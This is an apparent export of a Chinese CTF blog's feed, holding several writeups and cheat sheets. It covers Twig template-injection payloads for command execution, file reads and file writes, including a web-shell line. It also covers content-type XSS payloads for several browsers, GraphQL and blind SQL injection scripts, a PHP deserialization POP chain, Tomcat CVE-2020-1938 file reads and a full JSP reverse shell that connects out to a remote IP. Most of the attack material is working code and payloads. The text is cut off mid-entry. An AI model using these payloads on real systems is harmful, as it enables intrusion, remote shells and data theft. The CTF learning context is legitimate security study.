title="file_link"></a>file_link</h3><p>生成一个链接，还是<code>can not open</code> ，继续占个位置</p><pre><code>{{ '/tmp/111'|file_link(1) }}http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;amp;line=1#line1 </code></pre><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>从这次比赛学到了，tqlll</p><h3 id="显示变量"><a href="#显示变量" class="headerlink" title="显示变量"></a>显示变量</h3><p> <code>var_dump</code></p><p>上下文完整变量：</p><pre><code>{{dump()}}</code></pre><p>app 所有变量，不就是上面那个嘛</p><pre><code>{{dump(app)}}</code></pre><p><strong>所有环境变量</strong></p><pre><code>{{app.request.server.all|join(',')}}</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>注入{{app.request.query.filter(0,0,1024,{'options':'system'})}}并且 GET ?0=cat /etc/passwd</code></pre><p>或者</p><p>这个我试过报错了</p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')}}</code></pre><p>因为是数组，所以报错，所以应该拼接</p><p><strong>所以正确的应该是</strong></p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><p>或者</p><pre><code>{{['id']|map('passthru')}}"@aaa.bbb</code></pre><p>或者</p><pre><code>{{["id", 0]|reduce("passthru")}}{{[0, 0]|reduce("system", "id")|join(",")}}</code></pre><p>或者</p><pre><code>{{["id"]|filter('system')}}</code></pre><pre><code>{{["id", 0]|sort("system")|join(",")}}</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p><pre><code>{{app.request.files.get(key}}</code></pre><p>得到的是 临时文件名字</p><p><strong>然后下面是文件写入</strong></p><p>需要使用 multipart 文件上传</p><p>这里的<code>key</code>指的是</p><p>文件上传的<code>field</code>名字 </p><pre><code>{{app.request.files.get(key).move(app.request.query.get(1))}}并且GET 文件目录?1=/tmp/000</code></pre><p>内容如下：</p><pre><code>POST /subscribe?1=/tmp/000 HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file1"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="email""{{app.request.files.get('file').move(app.request.query.get(1))}}"@qq.com-----------------------------80447652219106375571633636037--</code></pre><p>文件目录可以的情况下如果没有 <code>/tmp/000</code>，就会创建文件夹</p><p>然后得到的是一个临时文件名</p><p><code>/tmp/000/phpdEjxsR</code></p><p>或者 另外一种</p><pre><code>{{{"<!--?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code--></code></pre><h3 id="任意文件读取"><code><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</code></h3><pre><code><code>{{'/etc/passwd'|file_excerpt(1,30)}}{{'/etc/passwd'|file_excerpt(0,-1)}}</code></code></pre><p><code>或者</code></p><code><pre><code>{{app.request.files.get('file').__construct('/etc/passwd','')}}{{app.request.files.get('file').openFile.fread(99)}}</code></pre><p>这两个需要在同一个请求连着一起用，就可以读取 <code>/etc/passwd</code>的内容了，读取<code>99</code>个字节</p><p>用到了 <code>app.request.files</code>的需要</p><p>multipart 的文件上传</p><p>以下成功了：</p><pre><code>POST /subscribe HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037</code></pre><p>参考:</p><p><a href="https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md" target="_blank" rel="noopener">https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md</a></p><p><a href="https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel" target="_blank" rel="noopener">https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel</a></p><p><a href="https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html" target="_blank" rel="noopener">https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html</a></p><p><a href="https://twig.symfony.com/doc/3.x/templates.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/templates.html</a></p></code><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Symfony </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firefox中content-type的XSS</title>
      <link href="/2020/03/31/firefox-content-type-xss/"/>
      <url>/2020/03/31/firefox-content-type-xss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识全靠writeup得到，师傅们tqlllll</p><h2 id="MIME-嗅探"><a href="#MIME-嗅探" class="headerlink" title="MIME 嗅探"></a>MIME 嗅探</h2><p>如果<code>content-type</code>是<code>text-plain</code>或者<code>空</code>的话</p><p>浏览器会根据内容格式来决定使用什么解析</p><p>比如:</p><pre><code>&lt;script&gt;alert()&lt;/script&gt;</code></pre><p>就按照<code>text/html</code>来解析</p><p>要防止<code>MIME</code>嗅探，设置</p><pre><code>X-Content-Type-Options：nosniff</code></pre><h2 id="设置"><a href="#设置" class="headerlink" title="设置 */*"></a>设置 <code>*/*</code></h2><p>表示让firefox 猜测 mime-type ，</p><p>即使设置了 <code>X-Content-Type-Options：nosniff</code></p><p>也可以使用，直接忽略，tqllll</p><p><strong>这个在chrome也可以</strong></p><h2 id="设置text-rdf"><a href="#设置text-rdf" class="headerlink" title="设置text/rdf"></a>设置<code>text/rdf</code></h2><p>然后xss 内容是</p><pre><code>&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><p>本地测试</p><pre><code>&lt;?phpheader('content-type:text/rdf');?&gt;&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h2 id="设置multipart-x-mixed-replace"><a href="#设置multipart-x-mixed-replace" class="headerlink" title="设置multipart/x-mixed-replace;"></a>设置<code>multipart/x-mixed-replace;</code></h2><p>tqlllll</p><p>irefox 有一个 <code>multipart/x-mixed-replace;</code> 类型</p><p>支持多部分响应</p><p>需要有一个 boundary 来分割</p><p>本地测试：</p><pre><code>&lt;?phpheader('content-type: multipart/x-mixed-replace;boundary="XXMIMEBOUNDARY"');?&gt;--XXMIMEBOUNDARYContent-type: text/html&lt;script&gt;alert()&lt;/script&gt;--XXMIMEBOUNDARY</code></pre><p>例子：</p><pre><code>Content-Type: Multipart/mixed; boundary="sample_boundary";Multipart not supported :(--sample_boundaryContent-Type: text/css; charset=utf-8Content-Location: http://localhost:2080/file.cssbody{ background-color: yellow;}--sample_boundaryContent-Type: application/x-javascript; charset=utf-8Content-Location: http://localhost:2080/file.jsalert("Hello from a javascript!!!");--sample_boundary</code></pre><p>师傅们tttttttttttqqqqqqqqlllllllllllll</p><h2 id="chrome-中的content-type-xss"><a href="#chrome-中的content-type-xss" class="headerlink" title="chrome 中的content-type xss"></a>chrome 中的content-type xss</h2><h3 id="设置-text-xsl"><a href="#设置-text-xsl" class="headerlink" title="设置 text/xsl"></a>设置 <code>text/xsl</code></h3><p>被处理为 xml</p><pre><code>Content-Type: text/xsl&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h3 id="设置为text-plain-text-html"><a href="#设置为text-plain-text-html" class="headerlink" title="设置为text/plain;,text/html"></a>设置为<code>text/plain;,text/html</code></h3><p>支持多种引号分割</p><pre><code>Content-Type: text/plain;,text/html&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><h2 id="关于-Edge-的content-type-xss"><a href="#关于-Edge-的content-type-xss" class="headerlink" title="关于 Edge 的content-type xss"></a>关于 Edge 的content-type xss</h2><h3 id="设置为text-vtt"><a href="#设置为text-vtt" class="headerlink" title="设置为text/vtt"></a>设置为<code>text/vtt</code></h3><p>被处理为 html</p><pre><code>Content-Type: text/vtt&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020 Qualifier部分writeup</title>
      <link href="/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/"/>
      <url>/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，才水了两道题</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>注册登录，看到请求：</p><p>登录的:</p><pre><code>{"query":"query login($input: LoginUser) {\n  login(user: $input) {\n  token login name email \n  }\n}\n","variables":{"input":{"login":"123","password":"123"}}}</code></pre><p>登录后的</p><pre><code>{"query":"query {books{pic \n author }}"}</code></pre><p>是用了<code>graphQL</code></p><p>可以<code>graphQL注入</code></p><pre><code>{"query":"query {__schema {types{ name } mutationType{name}}}"}</code></pre><p>然后得到详细情况</p><pre><code>{"query":"query {  __type(name: \"Query\") { name fields (includeDeprecated: true){ name type { name kind ofType{name kind description}}}}}"}</code></pre><p>看到有一个 <code>testGetUsersByFilter</code></p><p>然后看到它的 <code>oftype</code>等情况</p><p>得到用法，和登录的那个类似</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"admin","email":"or","name":"yuewuhen"}}}</code></pre><p>发现可以查询，</p><p>那么尝试是否有<code>mysql</code>或者<code>sqlite</code>等注入点</p><p>FUZZ后发现单引号被过滤了</p><p>那么应该是<code>sql</code>注入，而且查询的情况是使用了<code>or</code>查询</p><p>所以可以考虑用 <code>\\</code> 来注入</p><p>然后<code>FUZZ</code>发现是使用了<code>mysql</code>，而且空格被过滤了</p><p>最后就是简单的mysql注入了：</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"order/**/by/**/6;#"}}}</code></pre><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"union/**/select/**/1,(select/**/flag/**/from/**/flag),3,4,5,6#"}}}</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/library.png" alt=""></p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>打开是一个 <code>html</code>页面 什么都没有，<code>FUZZ</code>报错发现是</p><p><code>tomcat/9.0.24</code></p><p>前几天刚复现了<code>cve-2020-1938</code> 的<code>tomcat</code>漏洞</p><p>可以任意文件读取，如果有上传甚至可以<code>RCE</code></p><p>猜测<code>webapp</code>叫做<code>NetCorp</code>,</p><p>先查看<code>web.xml</code></p><p>外国的比赛加个 <code>proxychains</code>快点</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp WEB-INF/web.xml  netcorp.q.2020.volgactf.ru </code></pre><p>web.xml</p><pre><code>&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;      &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;        &lt;description&gt;Complaint info&lt;/description&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;error-page&gt;        &lt;error-code&gt;404&lt;/error-code&gt;        &lt;location&gt;/404.html&lt;/location&gt;    &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>很明显了，查看一下代码</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class netcorp.q.2020.volgactf.ru </code></pre><p><strong>代码</strong></p><pre><code>//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package ru.volgactf.netcorp;import java.io.File;import java.io.IOException;import java.io.PrintWriter;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Iterator;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.annotation.MultipartConfig;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.Part;@MultipartConfigpublic class ServeScreenshotServlet extends HttpServlet {    private static final String SAVE_DIR = "uploads";    public ServeScreenshotServlet() {        System.out.println("ServeScreenshotServlet Constructor called!");    }    public void init(ServletConfig config) throws ServletException {        System.out.println("ServeScreenshotServlet \"Init\" method called");    }    public void destroy() {        System.out.println("ServeScreenshotServlet \"Destroy\" method called");    }    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        String appPath = request.getServletContext().getRealPath("");        String savePath = appPath + "uploads";        File fileSaveDir = new File(savePath);        if (!fileSaveDir.exists()) {            fileSaveDir.mkdir();        }        String submut = request.getParameter("submit");        if (submut != null &amp;&amp; !submut.equals("true")) {        }        Iterator var7 = request.getParts().iterator();        while(var7.hasNext()) {            Part part = (Part)var7.next();            String fileName = this.extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = this.generateFileName(fileName);            String path = savePath + File.separator + hashedFileName;            if (!path.equals("Error")) {                part.write(path);            }        }        PrintWriter out = response.getWriter();        response.setContentType("application/json");        response.setCharacterEncoding("UTF-8");        out.print(String.format("{'success':'%s'}", "true"));        out.flush();    }    private String generateFileName(String fileName) {        try {            MessageDigest md = MessageDigest.getInstance("MD5");            md.update(fileName.getBytes());            byte[] digest = md.digest();            String s2 = (new BigInteger(1, digest)).toString(16);            StringBuilder sb = new StringBuilder(32);            int i = 0;            for(int count = 32 - s2.length(); i &lt; count; ++i) {                sb.append("0");            }            return sb.append(s2).toString();        } catch (NoSuchAlgorithmException var8) {            var8.printStackTrace();            return "Error";        }    }    private String extractFileName(Part part) {        String contentDisp = part.getHeader("content-disposition");        String[] items = contentDisp.split(";");        String[] var4 = items;        int var5 = items.length;        for(int var6 = 0; var6 &lt; var5; ++var6) {            String s = var4[var6];            if (s.trim().startsWith("filename")) {                return s.substring(s.indexOf("=") + 2, s.length() - 1);            }        }        return "";    }}</code></pre><p>文件名经过<code>md5</code></p><p>那就上传<code>jsp</code>文件，然后<code>rce</code>了</p><pre><code>&lt;%@page import="java.lang.*"%&gt;&lt;%@page import="java.util.*"%&gt;&lt;%@page import="java.io.*"%&gt;&lt;%@page import="java.net.*"%&gt;&lt;%  class StreamConnector extends Thread  {    InputStream zd;    OutputStream fm;    StreamConnector( InputStream zd, OutputStream fm )    {      this.zd = zd;      this.fm = fm;    }    public void run()    {      BufferedReader fr  = null;      BufferedWriter ctw = null;      try      {        fr  = new BufferedReader( new InputStreamReader( this.zd ) );        ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) );        char buffer[] = new char[8192];        int length;        while( ( length = fr.read( buffer, 0, buffer.length ) ) &gt; 0 )        {          ctw.write( buffer, 0, length );          ctw.flush();        }      } catch( Exception e ){}      try      {        if( fr != null )          fr.close();        if( ctw != null )          ctw.close();      } catch( Exception e ){}    }  }  try  {    String ShellPath;if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {  ShellPath = new String("/bin/sh");} else {  ShellPath = new String("cmd.exe");}    Socket socket = new Socket( "ip", 23561 );    Process process = Runtime.getRuntime().exec( ShellPath );    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  } catch( Exception e ) {}%&gt;</code></pre><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020新春战役GYCTF writeup</title>
      <link href="/2020/02/24/gyctf2020-writeup/"/>
      <url>/2020/02/24/gyctf2020-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>新春防疫的ctf公益比赛，有些题目可以在<code>buuoj</code>上面复现</strong></p><p>前两天做了发现差不多全是<code>sql注入</code>，要吐了，第三天的题还可以</p><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="简单的招聘"><a href="#简单的招聘" class="headerlink" title="简单的招聘"></a>简单的招聘</h3><p>在注册 登录那里有<code>insert into</code> 注入，<br>注入结果可以在 <code>pages-profile.php</code>看到</p><p><strong>注册页面</strong></p><pre><code>regname=a','1','1')#&amp;regpass=1</code></pre><p>发现成功注册，但是登录失败，盲猜密码经过了md5 加密</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select group_concat(column_name) from information_schema.columns where table_name=’flag’))#&amp;regpass=admin%27%7C%7C%271</p><p>获取列名</p><p>获取flag</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select flaaag from flag))#&amp;regpass=admin%27%7C%7C%271</p><p>数据库情况:</p><pre><code>表名：backup,flag,userflag:id,flaaag</code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>送分题</p><p>后缀<code>php3</code><br>上传成功在  执行 <code>/readflag</code>获得<code>flag</code></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>时间盲注，select 没了，提示<code>flag</code>在<code>fl4g</code>中</p><p>用 regexp注入</p><pre><code>import requestsimport timeimport stringurl='http://232047a84d5f4d3684012ab422bff8ae488f8539fdda475c.changame.ichunqiu.com/'def inj(payload):    t1=time.time()    req=requests.get(url,params={'id':payload})    t2=time.time()    print(t2-t1)    if t2-t1&gt;2:        return Trueflag='^'payload='0||if((fl4g regexp "{}"),sleep(2),1)'inj(payload)stri='-qwertyuiopasdfghjklzxcvbnm1234567890{}_='for i in range(50):    for j in stri:        tmp=payload.format(flag+j)        print(tmp)        a=inj(tmp)        if a is True:            flag+=j            print(flag)            break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题有点意思</p><ul><li>代码审计</li><li>反序列化字符串逃逸</li><li>pop链</li></ul><p><strong>CtrlCase 可以用反序列化逃逸控制</strong></p><p>然后就可以构造pop链</p><p>然后需要找 <code>__destruct</code> 的方法 利用下去</p><ul><li><p>开始想 用反序列化 update 改admin的密码，但是失败了(本地成功。。</p></li><li><p>inseRt iNto 插入用户名也失败了(本地成功。。</p></li><li><p>后来 select 1,md5(1) from user where username=?</p></li></ul><p>看到有回显 1 ，那就注入密码</p><p><strong>pop 链:</strong></p><pre><code>&lt;?phpclass User{    public $id;    public $age = null;    public $nickname = null;}class Info{    public $age;    public $nickname;    public $CtrlCase;}Class UpdateHelper{    public $id;    public $newinfo;    public $sql;}class dbCtrl{    public $hostname="127.0.0.1";    public $dbuser="noob123";    public $dbpass="noob123";    public $database="noob123";    public $name='c4ca4238a0b923820dcc509a6f75849b';    public $password="1";    public $mysqli;    public $token='admin';}$a=new Info();$b=new UpdateHelper();$c=new User();$d=new Info();$e=new dbCtrl();$d-&gt;CtrlCase=$e;$c-&gt;nickname=$d;#$c-&gt;age='update user SET password=? where 1';$c-&gt;age='select password,md5(1) from user where username=? oR 1';#$c-&gt;age='insErt iNto user (username,password,age,nickname) valueS ("m0on",?,"1","1")';$b-&gt;sql=$c;$a-&gt;CtrlCase=$b;$a-&gt;nickname="1";$las=serialize($a);echo $las."\n";echo strlen($las);</code></pre><p>从 <code>";s:8:"CtrlCase</code> 开始截取</p><p>然后需要反序列化逃逸 ，使用 *和union 来变成hacker逃逸</p><p>用 <code>python</code> 简单处理一下</p><pre><code>a='''";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}'''b=len(a)c=b//5d=''d+='*'*c+(b-c*5)*'union'+aprint(d)</code></pre><p>构造</p><pre><code>age=1&amp;nickname=***************************************************************************************************";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}</code></pre><p>md5解密 是yingyingying ，看来应该可以弱口令的吧，没有试。。。。醉了</p><p>然后登录在 update.php得到flag</p><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>叠堆注入 ， set 不能用 ，那就 用handler </p><p>?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</p><pre><code>http://40509bd15cd7405893c4b46c93a1efe7772e15de2f3542b3.changame.ichunqiu.com/?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</code></pre><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>pdo 预处理 使用了 <code>gbk</code>编码，导致宽字节注入，</p><p>叠堆 注入 ，</p><p><code>select</code> 不能用 ，用<code>set</code> 来注入</p><p>,然后时间盲注</p><pre><code>import requestsimport timeimport binasciiurl='http://a265f2d3937e403b89a0563c2dd9e88f7de2577c581345ab.changame.ichunqiu.com/?id='def requ(payload):    tmp='1%dd%27;set%20@a=0x{};prepare%20haha%20from%20@a;execute%20haha;'.format(hexpay(payload))    t1=time.time()    req=requests.get(url+tmp)    t2=time.time()    if t2-t1&gt;2:        return Truedef hexpay(payload):    pay=binascii.b2a_hex(payload.encode()).decode()    return paydb='^'for i in range(1,100):    #for j in range(40,130):    for j in '1234567890abcdefABCDEFz':        print(j)        #payload='''select if(ascii(substr(database(),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if(ascii(substr(( select group_concat(table_name) from information_schema.tables where table_schema='pdotest'  ),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if((select hex(group_concat(column_name)) regexp '{}' from information_schema.columns where table_name='table1' ),sleep(2),1)'''.format(db+j)        payload='''select if((select hex(fllllll4g) regexp '{}' from table1 ),sleep(2),1)'''.format(db+j)        #print(payload)        a=requ(payload)        if a is True:            db+=j            print(db)            break        if j=='z':            print('false********8')</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>先是获得 表名 ，</p><p>or 不能用了 ，</p><p>绕过<code>information_schema</code> </p><p><code>innodb</code> 也不能用了</p><p>用<code>sys.schema_table_statistics_with_buffer</code></p><p>然后 列名 无法得到，</p><p>union select 又不能用，版本<code>5.7</code></p><p>那就看官方文档 ，</p><p>看到了 </p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html</a></p><p>(column1,column2) = (1,1);</p><p>可以用类似盲注方法 </p><p>(column1,column2) &gt;= (1,1);</p><p>发现 两列的 所以 </p><p><code>where  (1,1)&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code></p><p>，试过几个发现 ， </p><p> <code>where  (1,'a')&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code><br>这样会出错，返回500 ，</p><p>而 第一列 测试发现int型的，</p><p>所以第二列是flag</p><p>所以用 <code>(select 0x61)</code>这样的代表第二列</p><pre><code>import requestsimport timeimport binasciiurl='http://e1feb1a7ba234a06a1669d7949ac16b7c16cbab87af44d76.changame.ichunqiu.com/index.php'def inj(payload):    req=requests.post(url,data={'id':payload})    if 'Hello CQGAME' in req.text:        return Truedb=''for i in range(50):    for j in range(30,130):        #payload='''2-(select hex( ( select database() )) regexp '{}'  )'''.format(db+j)        #payload='''2-(select hex( ( select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database() )) regexp '{}'  )'''.format(db+j)        payload='''3-(select 1   where ((select 1),(select {} ))&gt;= (select * from f1ag_1s_h3r3_hhhhh))'''.format('0x'+binascii.b2a_hex(db.encode()).decode()+hex(j).replace('0x',''))        print(payload)        a=inj(payload)        if  a is True:            db+=chr(j-1)            print(db)            break        if j==129:            print('false **********8')</code></pre><p>得到：</p><p>FLAG{2612D538-3A53-4B94-9079-567F7B6EB427|</p><p>只要把 最后一个 | 换成 }</p><p>再全部变成小写就可以了</p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h3 id="node-game"><a href="#node-game" 